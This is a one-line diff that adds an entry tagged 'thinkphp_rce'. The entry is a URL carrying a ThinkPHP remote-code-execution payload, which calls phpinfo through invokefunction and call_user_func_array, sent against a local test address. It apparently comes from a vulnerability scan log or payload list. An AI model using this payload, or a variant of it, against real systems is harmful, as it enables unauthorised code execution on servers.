@@ -1,0 +1,1 @@
+[thinkphp_rce] http://127.0.0.1:4280/phpinfo.php/index.php/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
